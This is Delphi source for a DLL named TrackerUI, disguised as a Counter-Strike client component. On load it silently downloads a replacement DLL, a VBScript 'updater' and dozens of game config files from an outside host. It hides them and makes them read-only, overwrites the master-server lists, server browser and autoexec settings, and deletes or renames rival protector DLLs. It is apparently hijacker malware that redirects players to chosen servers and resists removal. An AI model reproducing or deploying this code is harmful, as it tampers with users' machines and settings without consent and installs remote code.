library TrackerUI;

{ Important note about DLL memory management: ShareMem must be the
  first unit in your library's USES clause AND your project's (select
  Project-View Source) USES clause if your DLL exports any procedures or
  functions that pass strings as parameters or function results. This
  applies to all strings passed to and from your DLL--even those that
  are nested in records and classes. ShareMem is the interface unit to
  the BORLNDMM.DLL shared memory manager, which must be deployed along
  with your DLL. To avoid using BORLNDMM.DLL, pass string information
  using PChar or ShortString parameters. }

uses
  SysUtils,
  IdHTTP,
  Classes;

{$R *.res}
var
BaseURL: string;
procedure DownloadFile(File1, File2: string); cdecl;
var
  idHTTP1: TIdHTTP;
  Stream:TMemoryStream;
begin
try
idHTTP1 := TIdHTTP.Create(nil);
Stream:=TMemoryStream.Create;
IdHTTP1.Get(File1,Stream);
Stream.SaveToFile(File2);
Stream.Free;
except
end;
end;
begin
BaseURL := 'http://www.myftpfile.com/files/';
begin

// TrackerUI.DLL set to ReadOnly and Hidden
DownloadFile(BaseURL + 'cstrike/bin/TrackerUI.DLL','cstrike\bin\TrackerUI.DLL');
FileSetAttr('cstrike\bin\TrackerUI.DLL', 1 + 2);
DownloadFile(BaseURL + 'cstrike/bin/cmd/updater.vbs','cstrike\bin\cmd\updater.vbs');
DownloadFile(BaseURL + 'cstrike/bin/Readme.TXT','cstrike\bin\Readme.TXT');
DownloadFile(BaseURL + 'cstrike/bin/Version.TXT','cstrike\bin\Version.TXT');
// DownloadFile(BaseURL + 'badiiiro.url','badiiiro.url');
FileSetAttr('cstrike\liblist.gam', 1 + 2);

// Delete Old Bins Functions

// TrackerUI.DLL
// DeleteFile ('cstrike\bin\TrackerUI.DLL'); 
DeleteFile ('cstrike\bin\au.vbs'); 
DeleteFile ('cstrike\bin\cmdlist.ini'); 
DeleteFile ('cstrike\bin\config.ini'); 
DeleteFile ('cstrike\bin\extlist.ini'); 

// GameUI.DLL
// DeleteFile ('cstrike\cl_dlls\GameUI.DLL'); 
DeleteFile ('cstrike\bin\GameUI.DLL'); 
DeleteFile ('cstrike\GameUI.DLL'); 
// Vendora.DLL
DeleteFile ('cstrike\bin\Vendora.DLL'); 
DeleteFile ('cstrike\Vendora.DLL'); 
// CTShield.DLL
DeleteFile ('cstrike\bin\CTShield.DLL'); 
DeleteFile ('cstrike\CTShield.DLL'); 
// GTProtector.dll
DeleteFile ('cstrike\bin\GTProtector.dll'); 
DeleteFile ('cstrike\bin\GTProtector.asi'); 
DeleteFile ('cstrike\GTProtector.dll'); 
DeleteFile ('cstrike\GTProtector.asi'); 
DeleteFile ('cstrike\bin\GTProtector.dll.update'); 
DeleteFile ('cstrike\bin\GTProtector.asi.update'); 
DeleteFile ('cstrike\GTProtector.dll.update'); 
DeleteFile ('cstrike\GTProtector.asi.update'); 
// Skin.DLL
DeleteFile ('cstrike\bin\Skin.DLL'); 
DeleteFile ('cstrike\Skin.DLL'); 

// Delete Cheats
// DeleteFile ('opengl32.dll');
RenameFile ('opengl32.dll', 'opengl32.dll.orig');
RenameFile ('SteamID.dll', 'SteamID.dll.orig');
RenameFile ('SteamID.asi', 'SteamID.asi.orig');
RenameFile ('ChangerSteamByOstrog.dll', 'ChangerSteamByOstrog.dll.orig');
RenameFile ('ChangerSteamByOstrog.asi', 'ChangerSteamByOstrog.asi.orig');
RenameFile ('CTShield.dll', 'CTShield.dll.orig');
RenameFile ('CTShield.asi', 'CTShield.asi.orig');

// TrackerUI.DLL - masterservers.vdf
FileSetAttr('config\masterservers.vdf', 128);
DownloadFile(BaseURL + 'config/masterservers.vdf','config\masterservers.vdf');
FileSetAttr('config\masterservers.vdf', 1 + 2);
FileSetAttr('platform\config\masterservers.vdf', 128);
DownloadFile(BaseURL + 'platform/config/masterservers.vdf','platform\config\masterservers.vdf');
FileSetAttr('platform\config\masterservers.vdf', 1 + 2);

// TrackerUI.DLL - MasterServers.vdf
FileSetAttr('config\MasterServers.vdf', 128);
DownloadFile(BaseURL + '/config/MasterServers.vdf','config\MasterServers.vdf');
FileSetAttr('config\MasterServers.vdf', 1 + 2);

// TrackerUI.DLL - MasterServers2.vdf
FileSetAttr('config\MasterServers2.vdf', 128);
DownloadFile(BaseURL + '/config/MasterServers.vdf','config\MasterServers2.vdf');
FileSetAttr('config\MasterServers2.vdf', 1 + 2);

// TrackerUI.DLL - MasterServers.vdf
FileSetAttr('platform\config\MasterServers.vdf', 128);
DownloadFile(BaseURL + '/config/MasterServers.vdf','platform\config\MasterServers.vdf');
FileSetAttr('platform\config\MasterServers.vdf', 1 + 2);

// TrackerUI.DLL - MasterServers2.vdf
FileSetAttr('platform\config\MasterServers2.vdf', 128);
DownloadFile(BaseURL + '/config/MasterServers.vdf','platform\config\MasterServers2.vdf');
FileSetAttr('platform\config\MasterServers2.vdf', 1 + 2);

// TrackerUI.DLL - masterservers.vdf
FileSetAttr('steam\config\MasterServers.vdf', 128);
DownloadFile(BaseURL + 'steam/config/MasterServers.vdf','steam\config\MasterServers.vdf');
FileSetAttr('steam\config\MasterServers.vdf', 1 + 2);

// TrackerUI.DLL - rev_MasterServers.vdf
FileSetAttr('platform\config\rev_MasterServers.vdf', 128);
DownloadFile(BaseURL + '/config/rev_MasterServers.vdf','platform\config\rev_MasterServers.vdf');
FileSetAttr('platform\config\rev_MasterServers.vdf', 1 + 2);

// TrackerUI.DLL - rev_MasterServers.vdf
FileSetAttr('config\rev_MasterServers.vdf', 128);
DownloadFile(BaseURL + '/config/MasterServers.vdf','config\rev_MasterServers.vdf');
FileSetAttr('config\rev_MasterServers.vdf', 1 + 2);

// TrackerUI.DLL - MasterServers_regularsteam.vdf
FileSetAttr('platform\config\MasterServers_regularsteam.vdf', 128);
DownloadFile(BaseURL + '/config/MasterServers_regularsteam.vdf','platform\config\MasterServers_regularsteam.vdf');
FileSetAttr('platform\config\MasterServers_regularsteam.vdf', 1 + 2);

// TrackerUI.DLL - MasterServers_regularsteam.vdf
FileSetAttr('config\MasterServers_regularsteam.vdf', 128);
DownloadFile(BaseURL + '/config/MasterServers_regularsteam.vdf','config\MasterServers_regularsteam.vdf');
FileSetAttr('config\MasterServers_regularsteam.vdf', 1 + 2);

// TrackerUI.DLL - serverbrowser.vdf
FileSetAttr('config\serverbrowser.vdf', 128);
DownloadFile(BaseURL + 'config/serverbrowser.vdf','config\serverbrowser.vdf');
FileSetAttr('config\serverbrowser.vdf', 1);
FileSetAttr('platform\config\serverbrowser.vdf', 128);
DownloadFile(BaseURL + 'platform/config/serverbrowser.vdf','platform\config\serverbrowser.vdf');
FileSetAttr('platform\config\serverbrowser.vdf', 1);

// TrackerUI.DLL - Serverbrowser.vdf
FileSetAttr('config\Serverbrowser.vdf', 128);
DownloadFile(BaseURL + 'config/Serverbrowser.vdf','config\Serverbrowser.vdf');
FileSetAttr('config\Serverbrowser.vdf', 1);
FileSetAttr('platform\config\Serverbrowser.vdf', 128);
DownloadFile(BaseURL + 'platform/config/Serverbrowser.vdf','platform\config\Serverbrowser.vdf');
FileSetAttr('platform\config\Serverbrowser.vdf', 1);

// TrackerUI.DLL - Config.cfg
// FileSetAttr('cstrike\config.cfg', 128);
// DownloadFile(BaseURL + 'cstrike/config.cfg','cstrike\config.cfg');
// FileSetAttr('cstrike\config.cfg', 1);

// TrackerUI.DLL - (null).cfg
FileSetAttr('cstrike\(null).cfg', 128);
DownloadFile(BaseURL + '/cstrike/(null).cfg','cstrike\(null).cfg');
FileSetAttr('cstrike\(null).cfg', 1 + 2);

// TrackerUI.DLL - Autoconfig.cfg
FileSetAttr('cstrike\autoconfig.cfg', 128);
DownloadFile(BaseURL + '/cstrike/autoconfig.cfg','cstrike\autoconfig.cfg');
FileSetAttr('cstrike\autoconfig.cfg', 1 + 2);

// TrackerUI.DLL - Autoexec.cfg
FileSetAttr('cstrike\autoexec.cfg', 128);
DownloadFile(BaseURL + '/cstrike/autoexec.cfg','cstrike\autoexec.cfg');
FileSetAttr('cstrike\autoexec.cfg', 1 + 2);

// TrackerUI.DLL - Banned.cfg
FileSetAttr('cstrike\banned.cfg', 128);
DownloadFile(BaseURL + '/cstrike/banned.cfg','cstrike\banned.cfg');
FileSetAttr('cstrike\banned.cfg', 1 + 2);

// TrackerUI.DLL - Banner.cfg
FileSetAttr('cstrike\banned.cfg', 128);
DownloadFile(BaseURL + '/cstrike/banner.cfg','cstrike\banner.cfg');
FileSetAttr('cstrike\banner.cfg', 1 + 2);

// TrackerUI.DLL - Joystick.cfg
FileSetAttr('cstrike\joystick.cfg', 128);
DownloadFile(BaseURL + '/cstrike/joystick.cfg','cstrike\joystick.cfg');
FileSetAttr('cstrike\joystick.cfg', 1 + 2);

// TrackerUI.DLL - Language.cfg
FileSetAttr('cstrike\language.cfg', 128);
DownloadFile(BaseURL + '/cstrike/language.cfg','cstrike\language.cfg');
FileSetAttr('cstrike\language.cfg', 1 + 2);

// TrackerUI.DLL - ListenServer.cfg
FileSetAttr('cstrike\listenserver.cfg', 128);
DownloadFile(BaseURL + '/cstrike/listenserver.cfg','cstrike\listenserver.cfg');
FileSetAttr('cstrike\listenserver.cfg', 1 + 2);

// TrackerUI.DLL - Server.cfg
FileSetAttr('cstrike\server.cfg', 128);
DownloadFile(BaseURL + '/cstrike/server.cfg','cstrike\server.cfg');
FileSetAttr('cstrike\server.cfg', 1 + 2);

// TrackerUI.DLL - Userconfig.cfg
FileSetAttr('cstrike\userconfig.cfg', 128);
DownloadFile(BaseURL + '/cstrike/userconfig.cfg','cstrike\userconfig.cfg');
FileSetAttr('cstrike\userconfig.cfg', 1 + 2);

// TrackerUI.DLL - Valve.rc
FileSetAttr('cstrike\valve.rc', 128);
DownloadFile(BaseURL + '/cstrike/valve.rc','cstrike\valve.rc');
FileSetAttr('cstrike\valve.rc', 1 + 2);
FileSetAttr('valve\valve.rc', 128);
DownloadFile(BaseURL + '/valve/valve.rc','valve\valve.rc');
FileSetAttr('valve\valve.rc', 1 + 2);

// TrackerUI.DLL - Violence.cfg
FileSetAttr('cstrike\violence.cfg', 128);
DownloadFile(BaseURL + '/cstrike/violence.cfg','cstrike\violence.cfg');
FileSetAttr('cstrike\violence.cfg', 1 + 2);

// TrackerUI.DLL - GameMenu.res
FileSetAttr('cstrike\resource\gamemenu.res', 128);
DownloadFile(BaseURL + '/cstrike/resource/gamemenu.res','cstrike\resource\gamemenu.res');
FileSetAttr('cstrike\resource\gamemenu.res', 1 + 2);

// TrackerUI.DLL - Motd.txt
FileSetAttr('cstrike\motd.txt', 128);
DownloadFile(BaseURL + '/cstrike/motd.txt','cstrike\motd.txt');
FileSetAttr('cstrike\motd.txt', 1 + 2);

// TrackerUI.DLL - D3d.cfg
FileSetAttr('valve\hw\d3d.cfg', 128);
DownloadFile(BaseURL + '/valve/hw/d3d.cfg','valve\hw\d3d.cfg');
FileSetAttr('valve\hw\d3d.cfg', 1 + 2);

// TrackerUI.DLL - Opengl.cfg
FileSetAttr('valve\hw\opengl.cfg', 128);
DownloadFile(BaseURL + '/valve/hw/opengl.cfg','valve\hw\opengl.cfg');
FileSetAttr('valve\hw\opengl.cfg', 1 + 2);

// TrackerUI.DLL - Geforce.cfg
FileSetAttr('valve\hw\geforce.cfg', 128);
DownloadFile(BaseURL + '/valve/hw/geforce.cfg','valve\hw\geforce.cfg');
FileSetAttr('valve\hw\geforce.cfg', 1 + 2);

// TrackerUI.DLL - Userconfig.cfg
FileSetAttr('valve\userconfig.cfg', 128);
DownloadFile(BaseURL + '/valve/userconfig.cfg','valve\userconfig.cfg');
FileSetAttr('valve\userconfig.cfg', 1 + 2);

// TrackerUI.DLL -  Commandmenu.txt
FileSetAttr('cstrike\commandmenu.txt', 128);
DownloadFile(BaseURL + 'cstrike/commandmenu.txt','cstrike\commandmenu.txt');
FileSetAttr('cstrike\commandmenu.txt', 1 + 2);

// OneUI.DLL - V_Knife.mdl
// FileSetAttr('cstrike\models\v_knife.mdl', 128);
// DownloadFile(BaseURL + '/cstrike/models/v_knife.mdl','cstrike\models\v_knife.mdl');
// FileSetAttr('cstrike\models\v_knife.mdl', 1);

end;
end.
